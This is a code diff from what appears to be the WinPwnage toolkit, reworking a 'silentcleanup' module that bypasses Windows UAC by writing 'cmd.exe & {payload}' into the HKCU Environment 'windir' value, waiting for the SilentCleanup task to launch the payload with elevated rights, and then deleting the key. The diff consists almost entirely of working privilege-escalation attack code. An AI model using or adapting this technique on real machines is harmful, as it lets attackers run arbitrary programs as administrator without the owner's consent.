@@ -1,6 +1,5 @@
 import os
 import time
-import _winreg
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
@@ -16,17 +15,23 @@ silentcleanup_info = {
 }
 
 
+def silentcleanup_cleanup(path):
+	print_info("Performing cleaning")
+	if registry().remove_key(hkey="hkcu", path=path, name="windir", delete_key=False):
+		print_success("Successfully cleaned up")
+	else:
+		print_error("Unable to cleanup")
+		return False
+
 def silentcleanup(payload):
 	if payloads().exe(payload):
-		try:
-			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join("Environment"))
-			_winreg.SetValueEx(key, "windir", 0, _winreg.REG_SZ, "cmd.exe /k {} & ".format(os.path.join(payload)))
-			_winreg.CloseKey(key)
-		except Exception as error:
-			print_error("Unable to create registry keys, exception was raised: {}".format(error))
-			return False
+		path = "Environment"
+
+		if registry().modify_key(hkey="hkcu", path=path, name="windir", value="cmd.exe & {payload}".format(payload=os.path.join(payload)), create=True):
+			print_success("Successfully created WINDIR key containing payload ({payload})".format(payload=os.path.join(payload)))
 		else:
-			print_success("Successfully created WINDIR key containing payload ({})".format(os.path.join(payload)))
+			print_error("Unable to create registry keys")
+			return False
 
 		time.sleep(5)
 
@@ -37,17 +42,13 @@ def silentcleanup(payload):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
+				if "error" in Constant.output:
+					silentcleanup_cleanup(path)
 
 		time.sleep(5)
-
-		try:
-			key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Environment", 0, _winreg.KEY_ALL_ACCESS)
-			_winreg.DeleteValue(key, "windir")
-		except Exception as error:
-			print_error("Unable to cleanup")
-			return False
-		else:
-			print_success("Successfully cleaned up, enjoy!")
+		
+		if not silentcleanup_cleanup(path):
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
